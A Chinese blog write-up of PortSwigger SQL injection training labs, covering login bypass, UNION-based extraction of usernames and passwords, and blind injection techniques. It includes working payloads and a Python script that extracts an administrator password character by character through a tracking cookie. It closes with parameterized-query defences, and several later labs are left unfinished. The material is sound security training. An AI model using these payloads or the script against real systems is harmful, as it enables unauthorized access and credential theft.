---
title: WriteUp-portswigger-SQL注入系列
date: 2024-03-01 15:48:17
categories: 
    - CTF-WriteUp
tags: 
    - SQL注入
description: 基于portswigger靶场学习并练习SQL注入
---
<!--more-->


## 什么是SQL注入？

SQL注入（SQLi）是一个Web安全漏洞，允许攻击者干扰应用程序对其数据库的查询。这可能允许攻击者查看他们通常无法检索的数据。这可能包括属于其他用户的数据，或应用程序可以访问的任何其他数据。在许多情况下，攻击者可以修改或删除此数据，从而导致应用程序的内容或行为发生持久性更改。在某些情况下，攻击者可以升级SQL注入攻击，以危害底层服务器或其他后端基础设施。它还可以使他们执行拒绝服务攻击。

[SQL 注入就是借助网站上不健全的 SQL 拼接语句，将攻击者自己的 payload 拼接到原有的 SQL 语句中，使其在服务器上执行恶意 SQL 语句，使得攻击者可以对数据库进行网站运营者预料之外的增、删、改、查操作。](https://mp.weixin.qq.com/s/RTFrPLDiycU0nwZp4baiKQ)

## 如何检测SQL注入漏洞

- 手工SQL注入测试：
    - 单双引号：' " ，查看是否报错
    - 算数运算：比如在id=2的地方输入id=1+1，查看返回数据是否一致，一致说明可能存在注入点
    - 布尔条件：比如 OR 1=1 和 OR 1=2 ，比较两个响应是否有差异，如果存在注入点，前者返回的数据通常是比后者多的
    - 时间延迟：比如 sleep(5)，如果存在注入点，那么携带 payload 的请求，其响应时间应该会比正常的请求慢 5 秒
    - 带外测试：查看你的带外平台是否收到了对应的数据
- 自动化测试：
  - burp scanner：burp suite 自带的扫描器，自动化检测SQL注入漏洞
- SQL注入点：
  - `SELECT`语句：`WHERE`的子句
  - `UPDATE`语句：`UPDATE`的值或者`WHERE`的子句
  - `INSERT`语句：`INSERT`的值
  - `SELECT`语句：表名或列名
  - `SELECT`语句：`ORDER BY`子句

## 检索隐藏数据

- `--`是SQL注释符，可以注释掉后面的内容
- 在使用`OR 1=1`的时候要小心，如果在update或delete语句中使用，可能会导致数据意外丢失

### 🧪实验1：WHERE子句中的SQL注入漏洞允许检索隐藏数据

- 实验说明
  - 本实验在产品类别筛选器中包含一个SQL注入漏洞。当用户选择一个类别时，应用程序执行如下的SQL查询：
    ```sql
    SELECT * FROM products WHERE category = 'Gifts' AND released = 1
    ```
  - 任务：执行SQL注入攻击，使应用程序显示一个或多个未发布的产品

- 解题过程
  - 选择一个类别，然后查看URL中的参数
    `filter?category=Accessories`
  - 修改URL中的参数，尝试使用`'`和`"`，没报错，说明存在注入点
  - 构造payload：`' OR 1=1--`，查看返回数据，发现产品数量变多，完成实验✅
    ![](LAB1-1-注入成功.png)


## 颠覆应用逻辑

- 对于执行以下SQL来检查凭据，如果查询返回用户的详细信息，则登录成功，否则，登录失败
  ```sql
  SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
  ```
- 在这种情况下，用户可以以任何身份登录，而无需密码。通过`--`注释掉密码的判断，即可登录成功。
- 例子：
  ```sql
  SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
  # 此查询将返回username为administrator的用户的详细信息，而不需要密码
  ```

### 🧪实验2：允许绕过登录的SQL注入漏洞

#### 实验说明

- 一个存在SQL注入漏洞的登录表单
- 任务：绕过登录，以管理员身份登录

#### 解题过程

- 用户名处输入`administrator'--`，密码随意
  ![](LAB2-1-payload.png)
- 登录成功✅

## UNION注入

- 当应用程序容易受到SQL注入攻击时且查询结果在应用程序的响应中返回时，可以使用`UNION`关键字从数据库中的其他表中检索数据。这通常被称为SQL注入UNION攻击。
- `UNION`关键字可以执行一个或多个其他`SELECT`查询，并将结果合并到原始查询的结果中。
- 例子：
  ```sql
  SELECT a,b FROM table1 UNION SELECT c,d FROM table2
  # 此SQL查询返回一个包含两列的结果集，其中包含来自table1的a和b列的数据，以及来自table2的c和d列的数据
  ```
- `UNION`查询有效的两个关键要求：
  - 各个查询必须返回相同数量的列
  - 各个列中的数据类型必须在各个查询之间兼容
- 执行SQL注入UNION攻击必须满足的要求：
  - 从原始查询返回多少列
  - 从原始查询返回的那些列的数据类型适合保存插入查询的结果


### 确定所需的列数

- 在执行SQL注入UNION攻击时，有两种有效的方法可以确定从原始查询返回的列数：
  - **使用一系列`ORDER BY`子句，直到应用程序返回错误**
    - 例子：
        ```sql
        ' ORDER BY 1--
        ' ORDER BY 2--
        ' ORDER BY 3--
        etc.

        # 这一系列有效负载修改了原始查询，按照结果集中不同列对结果进行排序
        # `ORDER BY`子句中的列可以由其索引指定，因此不需要知道任何列名
        # 当指定的列索引超出了结果集中的列数时，应用程序通常会返回错误
        ```
    - 应用程序可能在HTTP响应中返回数据库错误，也可能返回一般的错误响应，甚至可能不返回任何错误提示。无论哪种方式，只要能够检测到错误，就可以推断出原始查询返回的列数
  - **使用一系列指定不同数量的空值的`UNION SELECT`语句，直到应用程序不再返回错误**
    - 例子：
        ```sql
        ' UNION SELECT NULL--
        ' UNION SELECT NULL,NULL--
        ' UNION SELECT NULL,NULL--
        etc.

        # 如果NULL的数量不匹配，数据库将返回错误
        # NULL可以为每一种常见的数据类型，因此当列数正确时，能最大限度地提高了有效负载成功的机会
        ```
    - 与`ORDER BY`子句一样，应用程序可能在HTTP响应中返回数据库错误，也可能返回一般的错误响应，甚至可能不返回任何错误提示。
    - 但如果 NULL 值的数量同结果集中列的数量匹配，数据库会在结果集中返回额外的列，其中每一列会包含 NULL 值。对 HTTP 响应的影响取决于应用程序的代码实现。如果够幸运的话，你可以在响应中看到其他内容，例如 HTML 表格的额外行。否则，NULL 值可能触发其他错误，例如 NullPointerException。最坏的情况下，响应可能与由不正确的 NULL 数引起的响应没有区别，使得确定列数的此方法无效。

#### 🧪实验3：SQL注入UNION攻击，确定查询返回的列数

- 实验说明
  - 类别删选器中包含一个SQL注入漏洞，查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。这种攻击的第一步时确定查询返回的列数。然后再后续的实验中将使用此技术构建完整的攻击。

- 解题过程
  - 使用`UNION SELECT NULL`进行注入，直到不再返回错误：
    ![](LAB3-1-注入成功.png)


#### 数据库特定用法

- 在Oracle上，每个`SELECT`语句必须包含`FROM`关键字并指定一个有效的表。
- Oracle上有一个名为`DUAL`的内置表，因此在Oracle上执行`UNION`攻击时查询可以是：
    ```sql
    ' UNION SELECT NULL FROM DUAL--
    ```
- payload使用双破折号`--`注释掉原始查询的剩余部分。
- 在MySQL上，双破折号后的注释符`--`后必须有一个空格。或者可以使用`#`作为注释符。
- 有关特定数据库的语法，详见[`SQL injection cheat sheet`](https://portswigger.net/web-security/sql-injection/cheat-sheet)


### 查找具有有用数据类型的列

- SQL注入UNION攻击能从注入的查询中检索结果。通常想要检索的数据是字符串形式的。这意味着需要在原始查询结果中找到数据类型为字符串数据或与字符串数据兼容的一个或多个列。
- 确定所需列的数量后，可以探测每一列以测试它是否可以容纳字符串数据，可以提交一系列的`UNION SELECT`的payload，依次将字符串数据插入到每一列中。如果列数据类型与字符串数据不兼容，则注入的查询将导致数据库错误。如果没有发生错误，并且应用程序的响应包含一些附加内容（包括注入的字符串值），则相关列适合于检索字符串数据。
- 例子：
  ```sql
  # 首先确定查询返回的列数是4列，然后探测每一列以测试它是否可以容纳字符串数据
  ' UNION SELECT 'a',NULL,NULL,NULL--
  ' UNION SELECT NULL,'a',NULL,NULL--
  ' UNION SELECT NULL,NULL,'a',NULL--
  ' UNION SELECT NULL,NULL,NULL,'a'--
  ```

#### 🧪实验4：SQL注入UNION攻击，查找具有有用数据类型的列

- 实验说明
  - 本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。这种攻击的第一步时确定查询返回的列数。然后识别与字符串数据兼容的列。
  - 本实验将提供一个随机值，需要使其出现在查询结果中。

- 解题过程
  - 首先使用`SELECT UNION NULL`确定返回的列数，经测试，当有3个`NULL`时,即`?category=Accessories' UNION SELECT NULL,NULL,NULL-- `，不再返回错误,因此返回的列数为3
    ![](LAB4-1-查询返回的列数.png)
  - 然后确认有用的数据类型的列，执行以下payload：
    ```sql
    # 只有第二个成功，因此第二列是字符串类型
    ?category=Accessories' UNION SELECT 'a',NULL,NULL-- 
    ?category=Accessories' UNION SELECT NULL,'eDqVcW',NULL-- 
    ?category=Accessories' UNION SELECT NULL,NULL,'a'-- 
    ```
  - 实验要求使用平台提供的随机值，因此将随机值插入到第二列中，即`?category=Accessories' UNION SELECT NULL,'eDqVcW',NULL-- `
    ![](LAB4-2-确定字符串类型的列（使用实验环境提供的随机字符串测试）.png)
  - 完成实验✅


### 检索感兴趣的数据

- 当确定了原始查询返回的列数并找到了哪些列可以保存字符串数据时，就可以检索感兴趣的数据了。
- 假设：
  - 原始查询返回两列，这两列都可以保存字符串数据
  - 注入点是`WHERE`子句中一个带引号的字符串
  - 数据库包含一个名为`users`的表，其中包含`username`和`password`列
- 在这个例子中，可以通过执行以下SQL注入UNION攻击来检索`username`和`password`列的数据：
  ```sql
  ' UNION SELECT username, password FROM users--
  ```
- 为了执行这个攻击，需要`users`表及列的名称。如果没有，可以猜测表和列的名称。所有现代数据库都提供了检查数据库结构的方法，能够通过这些方法来确定表和列的名称。


#### 🧪实验5：SQL注入UNION攻击，从其他表中检索数据

- 实验说明
  - 本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。
  - 数据库中包含一个名为`users`的表，其中包含`username`和`password`列。
  - 任务：执行SQL注入UNION攻击，检索`username`和`password`列的数据，并使用这些信息以`administrator`的身份登录。

- 解题过程
  - 首先确认列数：
    ``` sql
    ?category=Accessories' UNION SELECT NULL-- 
    ?category=Accessories' UNION SELECT NULL,NULL-- 
    # 成功，说明返回的列数为2
    ```
  - 然后确定每一列的类型：
    ```sql
    ?category=Accessories' UNION SELECT 'a',NULL-- 
    ?category=Accessories' UNION SELECT NULL,'a'-- 
    # 两个都成功，说明两列都是字符串类型
    ```
  - 使用`?category=Accessories' UNION SELECT username, password FROM users`进行注入，成功获取`username`和`password`列的数据
    ![](LAB5-1-获得用户名密码.png)
  - 使用获得的用户名和密码登录成功
  - 完成实验✅

### 在单个列中检索多个值

  - 在某些情况下，上一个示例中的查询可能只返回单个列。通过将值连接在一起，可以在此单个列中同时检索多个值。可以包含分隔符以区分组合值。
  - 例子：
    ```sql
    ' UNION SELECT username || '~' || password FROM users--
    # 在Oracle数据库中，可以使用`||`连接运算符来连接值
    # 将`username`和`password`连接在一起，并使用`~`作为分隔符，查询的结果包含所有用户名和密码例如：
    # ···
    # administrator~s3cure
    # wiener~peter
    # ···
    ```
  - 不同的数据库使用不同的语法来执行字符串连接。详见[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


#### 🧪实验6：SQL注入UNION攻击，在单个列中检索多个值

- 实验说明
  - 本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。
  - 数据库包含一个名为`users`的表，其中包含`username`和`password`列。
  - 任务：执行SQL注入UNION攻击，检索`username`和`password`列的数据，并使用这些信息以`administrator`的身份登录。

- 解题过程
  - 首先确认列数：
    ``` sql
    ?category=Lifestyle' UNION SELECT NULL-- 
    ?category=Lifestyle' UNION SELECT NULL,NULL-- 
    # 成功，说明返回的列数为2
    ```
  - 然后确认每一列的类型：
    ```sql
    ?category=Lifestyle' UNION SELECT 'a',NULL-- 
    # 报错，说明第一列是不是字符串类型
    ?category=Lifestyle' UNION SELECT NULL,'a'-- 
    # 成功，说明第二列是字符串类型
    ```
  - 只有一列是字符串，因此需要在单个列中检索`username`和`password`拼接值。
  - 猜测这是一个mysql数据库，因此使用`CONCAT`函数进行拼接：
    ```sql
    ?category=Lifestyle' UNION SELECT NULL,CONCAT(username, '~', password) FROM users-- 
    ```
  - 查到用户名密码，可以使用administrator登录
    ![](LAB6-1-获得用户名密码.png)
  - 完成实验✅


### 检查SQL注入攻击中的数据库

- 要利用SQL注入漏洞，通常需要查找有关数据库的信息，这包括：
  - **数据库软件的类型和版本**
  - **数据库包含的表和列**

#### 检查数据库的版本和类型

以下是一些用来确定某些常用数据库类型的数据库版本：

| 数据库类型 | 查询|
| --- | --- |
| Microsoft，MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

- 例子：
  - 使用`UNION SELECT @@version,NULL--`来检查数据库的版本
  - 返回的输出结果如下：
    ```
    Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
    Mar 18 2018 09:11:49
    Copyright (c) Microsoft Corporation
    Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
    ```
  - 可以看到数据库的版本是`Microsoft SQL Server 2016`


#### 🧪实验7：SQL注入攻击，查询数据库类别和版本（思路没问题，但是不成功，猜测实验环境有问题）

- 实验说明
  - 本实验在产品类别筛选器中包含一个SQL注入漏洞。可以使用UNION攻击从其他表中检索数据。
  - 任务：执行SQL注入攻击，确定数据库的类型和版本。

- 解题过程
  - 首先，确定返回的列数：
    ```sql
    ?category=Pets' UNION SELECT NULL-- 
    ?category=Pets' UNION SELECT NULL,NULL--  
    ?category=Pets' UNION SELECT NULL,NULL--  
    # 不成功。。
    ```
    <!-- ![](LAB7-1-查询返回的列数.png) -->


#### 列出数据库的内容

- 大多数数据库类型（Oracle除外），都有一个名为`information_schema`的系统表，其中包含有关数据库的信息。可以使用这个表来列出数据库中的表和列。
- 例：
  - 可以查询`information_schema.tables`表来列出数据库中的表:
    ```sql
    SELECT * FROM information_schema.tables
    ```
  - 结果示例：
    ```
    TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
    =====================================================
    MyDatabase     dbo           Products    BASE TABLE
    MyDatabase     dbo           Users       BASE TABLE
    MyDatabase     dbo           Feedback    BASE TABLE
    ```
  - 可以查询`information_schema.columns`表来列出数据库中的列:
    ```sql
    SELECT * FROM information_schema.columns WHERE table_name = 'users'
    ```
  - 结果示例：
    ```
    TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
    =================================================================
    MyDatabase     dbo           Users       UserId       int
    MyDatabase     dbo           Users       Username     varchar
    MyDatabase     dbo           Users       Password     varchar
    ```


#### 🧪实验8：SQL注入攻击，列出非Oracle数据库上的数据库内容

- 实验说明
  - 本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果将在应用程序的响应中返回，可以使用UNION攻击从其他表中检索数据。
  - 应用程序具有登录功能，数据库包含一个保存用户名和密码的表。
  - 任务：执行SQL注入攻击，确定表的名称和列的名称，查询所有用户的用户名和密码，以`administrator`的身份登录。


- 解题过程
  - 首先确定原始查询返回的列数：
    ```sql
    ?category=Gifts' UNION SELECT NULL,NULL-- 
    # 返回正常结果，所以返回的列数为2
    ```
  - 然后确定每一列的类型：
    ```sql
    ?category=Gifts' UNION SELECT 'a',NULL-- 
    ?category=Gifts' UNION SELECT NULL,'a'-- 
    # 两个都成功，说明两列都是字符串类型
    ```
  - 查询数据库中的表：
    ```sql
    ?category=Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--
    ```
    ![](LAB8-1-查询数据库中的所有表.png)
  - 发现一个名为`users_kdzjph`的表，猜测是目标表，尝试查询表中的列：
    ```sql
    ?category=Gifts' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'pg_user_mappings'--  
    ?category=Gifts' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'users_kdzjph'--  
    ```
    ![](LAB8-2-查看users_kdzjph的列.png)
  - 查询到了`password_ifndxh`和`username_aeoisd`列，查询所有用户的用户名和密码：
    ```sql
    ?category=Gifts' UNION SELECT username_aeoisd,password_ifndxh FROM users_kdzjph--  
    ```
    ![](LAB8-3-查询到所有用户名和密码.png)
  - 使用获得的用户名和密码登录
    ![](LAB8-4-登录成功.png)
  - 完成实验✅
  - 查询数据库中的类型：
    ```sql
    ?category=Gifts' UNION SELECT version(),NULL--
    ```
    ![](LAB8-5-查看数据库类型.png)

## SQL盲注入

### 什么是SQL盲注？

- 当应用程序易受SQL注入攻击，但其HTTP响应不包含相关SQL查询的结果或任何数据库错误的详细信息时，就会发生SQL盲注。
- 许多技术（如`UNION`攻击）对SQL盲注漏洞无效，因为它们依赖于应用程序的响应中包含有关查询结果的信息。但是，可以使用其他技术来利用SQL盲注漏洞。

### 通过触发条件响应利用SQL盲注（布尔盲注）

- 考虑一个应用程序，它使用跟踪Cookie来收集有关使用情况的分析。对应用程序的请求包括一个cookie头，如下所示：
  ```
  Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
  ```
- 当处理包含`TrackingId`的cookie的请求时，应用程序使用SQL查询来确定这是否是已知用户：
  ```sql
  SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
  ```
- 此查询易受SQL注入攻击，但查询结果不会返回给用户。但是应用程序的行为确实会有所不同，具体取决于查询是否返回数据。如果提交一个已识别的`TrackingId`，查询将返回数据，并且将在响应中收到一条“welcome back”的消息。
- 这种行为足以利用SQL盲注漏洞。可以通过有条件地触发不同的响应来检索信息，具体取决于注入的条件。
- 要确定漏洞是怎么工作的，假设发送了两个请求，cookie值中分别包含以下`TrackingId`：
  ```sql
  …xyz' AND '1'='1
  …xyz' AND '1'='2
  ```
- 第一个请求将返回数据，因为注入的`AND '1'='1`条件为真。
- 第二个请求将不返回数据，因为注入的`AND '1'='2`条件为假。
- 这使我们能够确定任何单个注入条件的答案，并一次提取一个数据。
- 例如：
  - 假设有一个名为`Users`的表，其中包含`username`和`password`列，以及一个名为`Administators`的用户。我们可以通过发送一系列输入来确定此用户的密码，以便每次测试密码的一个字符。
  - 首先可以输入：
    ```
    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
    ```
  - 这将返回`Welcome back`，表明注入的条件为真，因此密码的第一个字符大于`m`。
  - 然后可以输入：
    ```
    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
    ```
  - 这将不返回`Welcome back`，表明注入的条件为假，因此密码的第一个字符不大于`t`。
  - 最后输入以下信息，它返回`Welcome back`，表明密码的第一个字符是`s`：
    ```
    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
    ```
  - 通过重复这个过程，可以确定密码的每个字符。

- 注意：在Oracle数据库中，`SUBSTRING`函数被称为`SUBSTR`。详细可以参考[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

#### 🧪实验9：带条件响应的SQL盲注

- 实验说明
  - 本实验包含一个SQL盲注漏洞。应用程序使用跟踪cookie进行分析，并执行包含提交cookie值的SQL查询。
  - SQL查询的结果不会返回，也不显示错误消息。但是如果查询有返回，应用程序会在页面中显示“Welcome back”消息。
  - 数据库包含一个名为`users`的表，其中包含`username`和`password`列。
  - 任务：利用SQL盲注漏洞，确定`administrator`用户的密码，以`administrator`的身份登录。

- 解题过程
  - 首先，确定注入点：在cookie的`TrackingId`中注入`' AND '1'='1`和`' AND '1'='2`，发现返回的结果不一样，说明存在注入点
    ![](LAB9-1-测试注入点.png)
    ![](LAB9-2-测试注入点.png)
  - 拼接`TrackingId`，使用`AND`条件来判断密码的每一位
    ```
    ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'm
    ```
    ![](LAB9-3-测试密码第一位.png)
    ![](LAB9-3-得到密码第一位.png)
  - 其他位同理，通过输入`a-zA-Z0-9`来判断密码的每一位
  - 手工注入费时费力，因此可以通过python编程实现，同时使用二分查找法，加快速度：
    ```python
    import requests


    url = "https://0a4200f2037f22168015712d002c0009.web-security-academy.net/filter?category=Pets"
    password=""

    # cookies = {"TrackingId": "NEcgTt5umCL1PorI' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) < 'm; session=TAMJjOVBIkH0Dxb2XqzQwIFSZ0jWXvFa"}
    TrackingId_1="NEcgTt5umCL1PorI' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), "
    # TrackingId_2
    TrackingId_3=", 1) "
    TrackingId_4="<"
    TrackingId_5=" '"
    # TrackingId_6
    TrackingId_7="; session=TAMJjOVBIkH0Dxb2XqzQwIFSZ0jWXvFa"

    position = 1

    while True:
        # 二分法查找
        low = 32
        high = 127
        print("position: ",position)
        while low < high:

            mid = (low + high+1) // 2   # 将mid的计算方式调整为(low + high + 1) // 2，可以确保在最后一次循环中不会陷入死循环。
            if chr(mid) == ";": # 由于cookie中不能直接使用分号，所以需要转义
                cookies = {"TrackingId": TrackingId_1 + str(position) + TrackingId_3 + TrackingId_4 + TrackingId_5 + "\\"+chr(mid) + TrackingId_7}
            else:
                cookies = {"TrackingId": TrackingId_1 + str(position) + TrackingId_3 + TrackingId_4 + TrackingId_5 + chr(mid) + TrackingId_7}
            response = requests.get(url, cookies=cookies)
            if "Welcome back!" in response.text:
                high = mid -1
            else:
                low = mid
            print("position: ",position,"high: ", chr(high),str(high), "low: ", chr(low),str(low), "mid: ", chr((low + high+1) // 2),str((low + high+1) // 2))
        if low == high:
            print("x")
            if chr(low) == ";":
                cookies = {"TrackingId": TrackingId_1 + str(position) + TrackingId_3 + TrackingId_4 + TrackingId_5 + "\\"+chr(low) + TrackingId_7}
            else:
                cookies = {"TrackingId": TrackingId_1 + str(position) + TrackingId_3 + "=" + TrackingId_5 + chr(low) + TrackingId_7}
            if "Welcome back!" in requests.get(url, cookies=cookies).text:
                password += chr(low)
                print(password)
                position += 1
            else:
                break
        else:
            break
    print(password)
    ```
  - 经测试，即时不熟悉编码，编码也比手工注入或者burpsuite intruder遍历快很多。在了解原理后，其实可以直接使用sqlmap进行注入，但是这里为了练习手工注入，所以使用python编程实现。
  - 完成实验✅

### 基于错误的SQL注入(报错盲注)

- 基于错误的SQL注入是指您能够使用错误消息从数据库中提取或推断敏感数据的情况，即使在盲目的上下文中也是如此。可能性取决于数据库的配置和您能够触发的错误类型：
  - 您可以根据布尔表达式的结果，引导应用程序返回特定的错误响应。你可以像我们在上一节中看到的条件响应一样利用这一点。有关更多信息，请参见通过触发条件错误利用SQL盲注入。
  - 您可能能够触发错误消息，输出查询返回的数据。这有效地将原本盲目的SQL注入漏洞变成了可见的漏洞。有关详细信息，请参阅通过详细SQL错误消息提取敏感数据。

#### 通过触发条件错误利用SQL盲目注入
- 有些应用程序执行SQL查询，但无论查询是否返回任何数据，它们的行为都不会改变。上一节中的技术将不起作用，因为注入不同的布尔条件对应用程序的响应没有影响。
- 通常可以根据是否发生SQL错误来引导应用程序返回不同的响应。您可以修改查询，使其仅在条件为true时才导致数据库错误。通常，数据库抛出的未处理错误会导致应用程序的响应出现一些差异，例如错误消息。这使您能够推断注入条件的真实性。
- 例如：
  - 假设发送了两个请求，依次包含以下TrackingId cookie值：
    ```sql
    xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
    xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
    ```
  - 这些输入使用CASE关键字来测试条件，并根据表达式是否为true返回不同的表达式：
    - 对于第一个输入，CASE表达式的计算结果为'a'，这不会导致任何错误。
    - 对于第二个输入，它的计算结果为1/0，这会导致被零除错误。
  - 如果错误导致应用程序的HTTP响应不同，则可以使用它来确定注入的条件是否为true。
- 使用此技术，您可以通过一次测试一个字符来检索数据：
  ```sql
  xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
  ```

#### 🧪实验10：带条件错误的SQL盲注入

- 实验说明
  - 本实验包含一个SQL盲目注入漏洞。应用程序使用跟踪Cookie进行分析，并执行包含提交的Cookie值的SQL查询。
  - SQL查询的结果不会返回，应用程序也不会根据查询是否返回任何行而做出任何不同的响应。如果SQL查询导致错误，则应用程序返回自定义错误消息。
  - 该数据库包含一个名为users的不同表，其中的列名为username和password。您需要利用SQL盲目注入漏洞来找出管理员用户的密码。
  - 要解决实验，请以`administrator`的身份登录。
  - 注意：本实验使用Oracle数据库。有关更多信息，请参阅SQL注入备忘单。

- 解题过程

#### 通过详细的SQL错误消息提取敏感数据

- 数据库的错误配置有时会导致详细的错误消息。这些可能会提供对攻击者有用的信息。例如，考虑以下错误消息，它在将单引号注入id参数后出现：
  ```plaintext
  Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
  ```
- 这显示了应用程序使用我们的输入构造的完整查询。我们可以看到，在本例中，我们将注入到WHERE语句中的单引号字符串中。这使得构造包含恶意负载的有效查询变得更加容易。注释掉查询的其余部分可以防止多余的单引号破坏语法。
- 有时候，您可能会导致应用程序生成一条错误消息，其中包含查询返回的某些数据。这有效地将一个原本是盲目的SQL注入漏洞变成了一个可见的漏洞。
- 您可以使用CAST()函数来实现这一点。它使您能够将一种数据类型转换为另一种数据类型。例如，假设一个查询包含以下语句：
  ```sql
  CAST((SELECT example_column FROM example_table) AS int)
  ```
- 通常，你试图读取的数据是一个字符串。尝试将其转换为不兼容的数据类型（如int）可能会导致类似以下的错误：
  ```sql
  ERROR: invalid input syntax for type integer: "Example data"
  ```
- 如果字符限制阻止您触发条件响应，这种类型的查询也可能很有用。

#### 🧪实验11：可视的基于错误的SQL注入

- 实验说明
  - 本实验包含SQL注入漏洞。应用程序使用跟踪Cookie进行分析，并执行包含提交的Cookie值的SQL查询。不返回SQL查询的结果。
  - 数据库包含一个不同的表，名为users，列名为username和password。要解决这个实验，找到一种方法来泄露administrator用户的密码，然后登录到他们的帐户。

- 解题过程


### 通过触发时间延迟来利用SQL盲目注入（延时盲注）

- 如果应用程序在执行SQL查询时捕获数据库错误并妥善处理它们，则应用程序的响应不会有任何差异。这意味着前面的诱导条件错误的技术将不起作用。
- 在这种情况下，通常可以通过根据注入条件为true还是false触发时间延迟来利用SQL盲注入漏洞。由于SQL查询通常由应用程序同步处理，因此延迟SQL查询的执行也会延迟HTTP响应。这允许您根据接收HTTP响应所花费的时间来确定注入条件的真实性。
- 触发时间延迟的技术特定于所使用的数据库类型。例如，在Microsoft SQL Server上，您可以使用以下内容来测试条件并根据表达式是否为true触发延迟：
  ```sql
  '; IF (1=2) WAITFOR DELAY '0:0:10'--
  '; IF (1=1) WAITFOR DELAY '0:0:10'--
  ```
  - 在这种情况下，第一个查询将不会触发延迟，而第二个查询将会触发10秒的延迟。

- 使用这种技术，我们可以通过一次测试一个字符来检索数据：
  ```sql
  '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
  ```
- 在SQL查询中触发时间延迟的方法有很多种，不同的技术适用于不同类型的数据库。有关详细信息，请参阅SQL注入备忘单。

#### 🧪实验12：带时间延迟的SQL盲注入和信息检索

- 实验说明
- 解题过程

### 利用带外（OAST）技术进行SQL盲注入（带外盲注）

- 应用程序可能执行与上一个示例相同的SQL查询，但异步执行。应用程序继续在原始线程中处理用户的请求，并使用另一个线程使用跟踪cookie执行SQL查询。该查询仍然容易受到SQL注入的攻击，但目前为止所描述的技术都不起作用。应用程序的响应不依赖于查询是否返回任何数据、是否发生数据库错误或执行查询所花费的时间。

- 在这种情况下，通常可以通过触发与您控制的系统的带外网络交互来利用SQL盲注入漏洞。这些可以基于注入的条件来触发，以每次推断一条信息。更有用的是，数据可以直接在网络交互中泄露。

- 多种网络协议可用于此目的，但通常最有效的是DNS（域名服务）。许多生产网络允许DNS查询的自由出口，因为它们对于生产系统的正常运行至关重要。
#### 🧪实验13：带外交互的SQL盲注入
#### 🧪实验14：带外数据渗出的SQL盲注入

## 不同上下文中的SQL注入
### 通过XML编码绕过过滤器的SQL注入

## 二阶SQL注入

- 当应用程序处理来自HTTP请求的用户输入并以不安全的方式将输入合并到SQL查询中时，就会发生一阶SQL注入。
- 当应用程序从HTTP请求中获取用户输入并将其存储以备将来使用时，就会发生二阶SQL注入。这通常是通过将输入放入数据库来完成的，但在存储数据的位置不会出现漏洞。稍后，当处理不同的HTTP请求时，应用程序检索存储的数据，并以不安全的方式将其合并到SQL查询中。因此，二阶SQL注入也被称为存储SQL注入。
- 二阶SQL注入通常发生在开发人员意识到SQL注入漏洞的情况下，因此可以安全地处理输入到数据库中的初始位置。当数据稍后被处理时，它被认为是安全的，因为它以前被安全地放置在数据库中。在这一点上，数据是以一种不安全的方式处理的，因为开发人员错误地认为它是可信的。

## 如何防止SQL注入

- 您可以使用**参数化查询**而不是查询中的字符串连接来防止大多数SQL注入实例。这些参数化查询也称为"预准备语句"。
- 以下代码容易受到SQL注入攻击，因为用户输入直接连接到查询中：
  ```java
  String query = "SELECT * FROM products WHERE category = '"+ input + "'";
  Statement statement = connection.createStatement();
  ResultSet resultSet = statement.executeQuery(query);
  ```
- 您可以重写此代码，以防止用户输入干扰查询结构：
  ```java
  PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
  statement.setString(1, input);
  ResultSet resultSet = statement.executeQuery();
  ```
- 对于不受信任的输入在查询中显示为数据的任何情况，包括WHERE子句和INSERT或UPDATE语句中的值，都可以使用参数化查询。它们不能用于处理查询的其他部分中的不受信任的输入，如表或列名，或ORDER BY子句。将不受信任的数据放入查询的这些部分的应用程序功能需要采取不同的方法，例如：
  - 将允许的输入值列入白名单。
  - 使用不同的逻辑来交付所需的行为。
- 为了使参数化查询能够有效地防止SQL注入，查询中使用的字符串必须始终是硬编码的常量。它绝不能包含来自任何来源的任何可变数据。不要试图逐个确定数据项是否可信，对于被认为安全的情况，请继续在查询中使用字符串连接。很容易在数据的可能来源上犯错误，或者在其他代码中的更改会污染可信数据。
